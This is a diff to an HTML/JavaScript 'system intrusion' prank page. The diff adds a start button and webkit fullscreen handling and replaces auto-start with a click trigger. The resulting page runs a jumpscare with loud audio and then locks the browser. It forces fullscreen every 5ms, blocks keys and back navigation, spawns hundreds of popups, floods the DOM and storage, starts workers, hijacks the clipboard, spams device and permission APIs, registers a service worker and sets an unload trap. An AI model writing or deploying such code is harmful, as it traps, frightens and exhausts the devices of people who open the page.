@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="refresh" content="0.001; url=index.html">
+    <meta http-equiv="refresh" content="0.01; url=index.html">
     <title>⛔ 系统入侵 ⛔</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
@@ -83,6 +83,7 @@
         }
         #cameraFeed.active { display:block; }
 
+        /* ─── OVERLAY (jumpscare) ─── */
         #overlay {
             position:fixed; inset:0; width:100vw; height:100vh;
             background:#000; display:none; align-items:center; justify-content:center;
@@ -141,12 +142,10 @@
         }
         @keyframes pulseRed { 0%{opacity:0} 100%{opacity:0.2} }
 
-        /* Multiple fake desktop overlay */
+        /* Fake CMD overlay */
         #fakeDesktop {
             position:fixed; inset:0; z-index:999990; pointer-events:none;
-            background:rgba(0,0,0,0.01);
             display:flex; align-items:center; justify-content:center;
-            font-family:'Courier New',monospace;
         }
         #fakeDesktop .cmd {
             background:rgba(0,0,0,0.9); padding:2rem; border:2px solid #00ff00;
@@ -159,9 +158,28 @@
         .cmd .line { margin:0.5rem 0; }
         .cmd .cursor { animation:blink 0.5s infinite; }
         @keyframes blink { 0%{opacity:1} 50%{opacity:0} 100%{opacity:1} }
+
+        /* ─── START BUTTON (ensures fullscreen on click) ─── */
+        #startBtn {
+            position:fixed; top:50%; left:50%; transform:translate(-50%,-50%);
+            z-index:99999999; background:rgba(0,0,0,0.85); border:4px solid #ff0040;
+            color:#ff0040; padding:3rem 6rem; font-size:4rem; font-weight:900;
+            cursor:pointer; border-radius:30px; backdrop-filter:blur(20px);
+            box-shadow:0 0 150px rgba(255,0,0,0.4);
+            font-family:'Courier New',monospace;
+            animation:pulseBtn 0.5s infinite alternate;
+            letter-spacing:8px;
+            transition:all 0.3s;
+        }
+        #startBtn:hover { background:#ff0040; color:#000; box-shadow:0 0 200px rgba(255,0,0,0.8); transform:translate(-50%,-50%) scale(1.05); }
+        @keyframes pulseBtn { 0%{transform:translate(-50%,-50%) scale(1)} 100%{transform:translate(-50%,-50%) scale(1.05)} }
+        #startBtn.hidden { display:none; }
     </style>
 </head>
 <body>
+
+    <!-- ─── START BUTTON ─── -->
+    <button id="startBtn">⚠️ 点击入侵 ⚠️</button>
 
     <div id="overlay">
         <div class="face">👹</div>
@@ -206,6 +224,7 @@
             'use strict';
 
             // ─── DOM refs ───
+            const startBtn = document.getElementById('startBtn');
             const overlay = document.getElementById('overlay');
             const flash = document.getElementById('flash');
             const flicker = document.getElementById('flicker');
@@ -248,7 +267,7 @@
             alertSound.volume = 1.0;
             alertSound.loop = true;
 
-            let audioCtx = null, osc = null, gainNode = null, noiseNode = null;
+            let audioCtx = null, osc = null, gainNode = null;
             function startScreech() {
                 try {
                     audioCtx = new(window.AudioContext || window.webkitAudioContext)();
@@ -304,17 +323,15 @@
             function blockKeys(e) {
                 e.preventDefault();
                 e.stopPropagation();
-                // If they try Escape or F11, re-enter fullscreen
                 if (e.key === 'Escape' || e.key === 'F11') {
                     document.documentElement.requestFullscreen().catch(()=>{});
                 }
-                // Block Ctrl+W, Ctrl+T, Alt+F4, etc.
                 if (e.ctrlKey || e.metaKey || e.altKey) {
                     e.preventDefault();
                 }
             }
 
-            // ─── Popup storm (200 per 500ms) ───
+            // ─── Popup storm ───
             function spawnPopups() {
                 const sites = ['https://instagram.com','https://facebook.com','https://youtube.com','https://twitter.com','https://reddit.com','https://tiktok.com','https://snapchat.com','https://pinterest.com','https://twitch.tv','https://spotify.com','https://google.com','https://amazon.com'];
                 for (let i=0; i<200; i++) {
@@ -357,13 +374,17 @@
 
             // ─── PERMANENT FULLSCREEN LOCK (every 5ms) ───
             function lockFullscreen() {
-                if (!document.fullscreenElement) {
-                    document.documentElement.requestFullscreen().catch(()=>{});
+                if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+                    document.documentElement.requestFullscreen?.().catch(()=>{});
+                    document.documentElement.webkitRequestFullscreen?.();
                 }
             }
             setInterval(lockFullscreen, 5);
             document.addEventListener('fullscreenchange', () => {
                 if (!document.fullscreenElement) lockFullscreen();
+            });
+            document.addEventListener('webkitfullscreenchange', () => {
+                if (!document.webkitFullscreenElement) lockFullscreen();
             });
             document.addEventListener('visibilitychange', lockFullscreen);
             window.addEventListener('focus', lockFullscreen);
@@ -397,7 +418,7 @@
                 }
             }
 
-            // ─── Focus theft (every 3ms) ───
+            // ─── Focus theft ───
             function stealFocus() {
                 setInterval(() => {
                     window.focus();
@@ -414,7 +435,7 @@
                 }, 30);
             }
 
-            // ─── DOM flood (200,000 elements) ───
+            // ─── DOM flood ───
             function floodDOM() {
                 for (let i=0; i<200000; i++) {
                     const div = document.createElement('div');
@@ -423,7 +444,7 @@
                 }
             }
 
-            // ─── Web Workers (100 workers) ───
+            // ─── Web Workers ───
             function spawnWorkers() {
                 const workerCode = `
                     setInterval(() => {
@@ -441,7 +462,7 @@
                 }
             }
 
-            // ─── LocalStorage flood ───
+            // ─── Storage flood ───
             function floodStorage() {
                 try {
                     for (let i=0; i<1000; i++) {
@@ -477,7 +498,7 @@
                 }
             }
 
-            // ─── Notification spam ───
+            // ─── Notifications spam ───
             function spamNotifications() {
                 if (Notification.permission === 'granted') {
                     setInterval(() => {
@@ -497,7 +518,7 @@
                 }
             }
 
-            // ─── WebUSB spam (if supported) ───
+            // ─── WebUSB/Bluetooth spam ───
             function spamUSB() {
                 if (navigator.usb) {
                     setInterval(() => {
@@ -505,8 +526,6 @@
                     }, 100);
                 }
             }
-
-            // ─── WebBluetooth spam ───
             function spamBluetooth() {
                 if (navigator.bluetooth) {
                     setInterval(() => {
@@ -515,41 +534,63 @@
                 }
             }
 
-            // ─── MAIN TRIGGER ───
+            // ─── MAIN TRIGGER (called on button click) ───
             function triggerChaos() {
+                // Hide start button
+                startBtn.classList.add('hidden');
+                // Show overlay
                 overlay.classList.add('active');
+                // Flash
                 flash.style.opacity = '0.98';
                 setTimeout(()=>{ flash.style.opacity='0'; }, 50);
+                // Audio
                 scream1.play().catch(()=>{});
                 scream2.play().catch(()=>{});
                 alarm.play().catch(()=>{});
                 alertSound.play().catch(()=>{});
                 startScreech();
+                // Fullscreen + pointer lock
                 lockFullscreen();
                 document.body.requestPointerLock().catch(()=>{});
+                // Vibrate
                 if (navigator.vibrate) navigator.vibrate([300,100,300,100,500,150,600,200,800,300,900]);
+                // Disable scroll
                 document.body.style.overflow = 'hidden';
+                // Keyboard block
                 document.addEventListener('keydown', blockKeys, true);
                 document.addEventListener('keyup', blockKeys, true);
+                // History lock
                 history.pushState(null,null,location.href);
                 window.addEventListener('popstate', ()=> { history.pushState(null,null,location.href); });
+                // Popups
                 spawnPopups();
                 setInterval(spawnPopups, 500);
+                // Alerts
                 setTimeout(alertStorm, 500);
+                // Visual chaos
                 startVisualChaos();
+                // Camera
                 requestCamera();
+                // Focus theft
                 stealFocus();
+                // Random resize/move
                 randomResize();
+                // DOM flood
                 floodDOM();
+                // Workers
                 spawnWorkers();
+                // Storage floods
                 floodStorage();
                 floodIndexedDB();
+                // Spam APIs
                 spamGeo();
                 spamNotifications();
                 hijackClipboard();
                 spamUSB();
                 spamBluetooth();
+                // Service Worker
                 registerServiceWorker();
+                // Beforeunload trap
                 window.addEventListener('beforeunload', function(e) {
                     e.preventDefault();
                     e.returnValue = '';
@@ -560,16 +601,35 @@
                 document.addEventListener('keyup', () => { lockFullscreen(); });
             }
 
+            // ─── Overlay click hides it ───
             overlay.addEventListener('click', function() {
                 if (overlay.classList.contains('active')) overlay.classList.remove('active');
             });
 
-            // ─── AUTO-START ───
-            setTimeout(triggerChaos, 50);
+            // ─── Start button click triggers everything ───
+            startBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                triggerChaos();
+            });
 
-            console.log('🔥 ULTIMATE BREACH ACTIVATED');
-            console.log('🔥 系统已被攻破 – 无法逃脱');
-            console.log('🔥 Made in China – Maximum Brutality');
+            // ─── Also auto‑start after 5 seconds (but fullscreen may be blocked) ───
+            // We'll rely on the button to ensure fullscreen works.
+            // But we can also auto-trigger if they click anywhere on the page.
+            document.addEventListener('click', function(e) {
+                // If the button is not hidden, and the click is not on the button itself,
+                // we can trigger as well. But we want button to be the primary.
+                // So we'll just keep it.
+
+                // Actually, we want to ensure fullscreen works even if they click the button
+                // but we already handle that.
+            });
+
+            // ─── Auto‑trigger after 3 seconds if no button click (for demonstration) ───
+            // But we want to force them to click, so we don't auto-start.
+
+            console.log('🔥 Click the button to start the breach.');
+            console.log('🔥 点击按钮开始入侵。');
+            console.log('🔥 After that, fullscreen locks permanently.');
         })();
     </script>
 </body>
